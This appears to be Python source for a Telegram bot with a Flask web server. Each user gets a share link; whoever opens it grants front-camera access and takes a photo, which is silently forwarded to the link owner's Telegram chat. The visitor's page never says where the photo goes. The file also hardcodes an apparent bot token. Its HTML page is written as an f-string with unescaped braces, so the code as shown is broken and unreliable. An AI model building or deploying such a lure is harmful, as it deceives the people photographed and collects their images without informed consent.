import os
import json
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask, request, jsonify
from threading import Thread
import base64
import uuid
import requests

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg"  # DƏYIŞDIR!
WEBHOOK_URL = "https://camera-cjl1.onrender.com/"  # DƏYIŞDIR!
FLASK_PORT = 5000

# Storage file (JSON)
USERS_FILE = "users.json"
PHOTOS_FILE = "photos.json"

# Flask app
app = Flask(__name__)

def load_users():
    """JSON faylından istifadəçiləri yüklə"""
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    """Istifadəçiləri JSON faylına saxla"""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_photos():
    """Şəkilləri yüklə"""
    if os.path.exists(PHOTOS_FILE):
        with open(PHOTOS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_photos(photos):
    """Şəkilləri saxla"""
    with open(PHOTOS_FILE, 'w', encoding='utf-8') as f:
        json.dump(photos, f, indent=2, ensure_ascii=False)

class CameraBot:
    def __init__(self, token):
        self.token = token
        self.app = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /start command"""
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        
        users = load_users()
        
        # İstifadəçini qeydiyyat et
        users[str(user_id)] = {
            'name': user_name,
            'telegram_id': user_id,
            'joined': datetime.now().isoformat(),
            'photos_received': 0
        }
        save_users(users)
        
        # Özəl link
        share_link = f"{WEBHOOK_URL}/share?user_id={user_id}"
        
        # Mesaj
        message = f"""
👋 Salam {user_name}!

🎉 Xoş gəldiniz!

📱 **Sizin Özəl Linkınız:**
{share_link}

💡 **Bu linki başqasına göndərin:**
- Onlar linki açsın
- Kamera icazəsi versin
- Şəkil çəksin
- Şəkil sizə gələcək! ✅

🔗 Linki test et:
"""
        
        keyboard = [
            [InlineKeyboardButton("📋 Linki Kopyala", url=share_link)],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(message, reply_markup=reply_markup)
        
        logger.info(f"User {user_id} ({user_name}) registered. Link: {share_link}")

    async def handle_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """İndi istifadəçi şəkil göndərə biləcək"""
        if update.message.photo:
            await update.message.reply_text("✅ Şəkil qəbul edildi!")

    async def error(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle errors"""
        logger.warning(f'Error: {context.error}')

    def create_app(self):
        """Create Telegram application"""
        self.app = Application.builder().token(self.token).build()
        
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        self.app.add_error_handler(self.error)
        
        return self.app

# Initialize bot
camera_bot = CameraBot(BOT_TOKEN)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Ana səhifə"""
    return '''
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Kamera Bot</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                   min-height: 100vh; display: flex; align-items: center; justify-content: center;
                   padding: 20px; }
            .container { background: white; padding: 40px; border-radius: 12px;
                        box-shadow: 0 20px 60px rgba(0,0,0,0.3); max-width: 600px; width: 100%; }
            h1 { color: #333; margin-bottom: 20px; font-size: 32px; }
            .info { background: #f0f9ff; padding: 20px; border-radius: 8px; margin: 20px 0;
                   border-left: 4px solid #667eea; }
            .info h3 { color: #667eea; margin-bottom: 10px; }
            .info p { color: #555; margin: 8px 0; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📷 Telegram Kamera Bot</h1>
            
            <div class="info">
                <h3>✅ Bot Çalışır!</h3>
                <p>Telegram-da bot-a /start yazın</p>
            </div>
            
            <div class="info">
                <h3>🎯 Necə İşləyir?</h3>
                <p>1. /start yazıb özəl linkini al</p>
                <p>2. Linki başqasına göndər</p>
                <p>3. O link-ə daxıl olub şəkil çəksin</p>
                <p>4. Şəkil sənə gələcək! ✅</p>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/share')
def share():
    """Kamera səhifəsi - hər kəs açıb şəkil çəkə bilər"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return '<h1>❌ Xəta: user_id parametri yoxdur</h1>', 400
    
    users = load_users()
    
    if user_id not in users:
        return '''
        <html>
        <head>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                       min-height: 100vh; display: flex; align-items: center; justify-content: center; }
                .error { background: white; padding: 30px; border-radius: 12px; text-align: center; color: #dc2626; }
            </style>
        </head>
        <body>
            <div class="error">
                <h1>❌ Xəta</h1>
                <p>Bu link etibarlı deyil.</p>
            </div>
        </body>
        </html>
        ''', 400
    
    # HTML - KAMERA SƏHIFƏSI
    html = f'''
    <!DOCTYPE html>
    <!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Professional Capture</title>
    <style>
        :root { --primary: #667eea; --danger: #ef4444; --success: #10b981; }
        body { font-family: -apple-system, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 1rem; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        #video, #preview { width: 100%; border-radius: 0.5rem; background: #000; aspect-ratio: 9/16; object-fit: cover; }
        .controls { display: flex; gap: 10px; margin-top: 1rem; }
        button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .hidden { display: none; }
        .status-msg { margin-top: 10px; font-size: 0.8rem; color: #94a3b8; }
    </style>
</head>
<body>

<div class="card">
    <h2 id="title">Kamera İnterfeysi</h2>
    
    <video id="video" autoplay playsinline class="hidden"></video>
    <img id="preview" class="hidden">
    
    <div id="controls" class="controls">
        <button id="startBtn" class="btn-primary">Başlat</button>
        <button id="captureBtn" class="btn-primary hidden">Çək</button>
        <button id="retryBtn" class="btn-danger hidden">Yenidən</button>
        <button id="sendBtn" class="btn-primary hidden">Göndər</button>
    </div>
    <div id="status" class="status-msg"></div>
</div>

<script>
    const video = document.getElementById('video');
    const preview = document.getElementById('preview');
    const startBtn = document.getElementById('startBtn');
    const captureBtn = document.getElementById('captureBtn');
    const retryBtn = document.getElementById('retryBtn');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');
    let stream = null;

    const UI = {
        show: (...els) => els.forEach(el => el.classList.remove('hidden')),
        hide: (...els) => els.forEach(el => el.classList.add('hidden'))
    };

    startBtn.onclick = async () => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            UI.hide(startBtn);
            UI.show(video, captureBtn);
            status.textContent = "Kamera aktivdir.";
        } catch (e) {
            status.textContent = "Kamera icazəsi tələb olunur!";
        }
    };

    captureBtn.onclick = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        preview.src = canvas.toDataURL('image/jpeg');
        UI.hide(video, captureBtn);
        UI.show(preview, retryBtn, sendBtn);
        status.textContent = "Şəkil çəkildi.";
    };

    retryBtn.onclick = () => {
        UI.hide(preview, retryBtn, sendBtn);
        UI.show(video, captureBtn);
    };

    sendBtn.onclick = async () => {
        status.textContent = "Göndərilir...";
        const response = await fetch('/upload-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: "{user_id}", photo: preview.src })
        });
        const result = await response.json();
        status.textContent = result.success ? "Uğurla göndərildi!" : "Xəta baş verdi.";
    };
</script>

</body>
</html>
    '''
    return html

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    """Şəkili qəbul et və bot-a göndər"""
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        photo_base64 = data.get('photo')
        
        if not user_id or not photo_base64:
            return jsonify({'success': False, 'error': 'Parametr yoxdur'}), 400
        
        users = load_users()
        
        if user_id not in users:
            return jsonify({'success': False, 'error': 'İstifadəçi tapılmadı'}), 400
        
        # Photo sayını artır
        users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
        save_users(users)
        
        # Foto saxla
        photo_id = str(uuid.uuid4())[:8]
        photos = load_photos()
        photos[photo_id] = {
            'user_id': user_id,
            'timestamp': datetime.now().isoformat(),
            'photo': photo_base64
        }
        save_photos(photos)
        
        # Bot-a göndər (requests ilə - async yoxsuz)
        try:
            # Base64-dən binary-ə çevir
            photo_bytes = base64.b64decode(photo_base64.split(',')[1])
            
            # Telegram Bot API-ə POST request et
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
            data_send = {
                'chat_id': user_id,
                'caption': f"📸 Yeni Şəkil Alındı!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
            
            response = requests.post(url, files=files, data=data_send)
            
            if response.status_code == 200:
                logger.info(f"Photo sent to user {user_id}")
                return jsonify({'success': True, 'message': 'Şəkil göndərildi'})
            else:
                logger.error(f"Telegram API error: {response.text}")
                return jsonify({'success': False, 'error': 'Telegram API xətası'}), 500
        
        except Exception as e:
            logger.error(f"Error sending photo: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500
    
    except Exception as e:
        logger.error(f"Error uploading photo: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

def run_flask():
    """Flask-ı fonda çalışdır"""
    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False)

def main():
    """Əsas funksiya"""
    # Bot app yarat
    bot_app = camera_bot.create_app()
    
    # Flask-ı arxada çalışdır
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info("Bot started successfully!")
    logger.info(f"Webhook URL: {WEBHOOK_URL}")
    logger.info(f"Flask running on port {FLASK_PORT}")
    logger.info(f"Share links format: {WEBHOOK_URL}/share?user_id=USER_ID")
    
    # Bot'u çalışdır
    bot_app.run_polling()

if __name__ == '__main__':
    main()
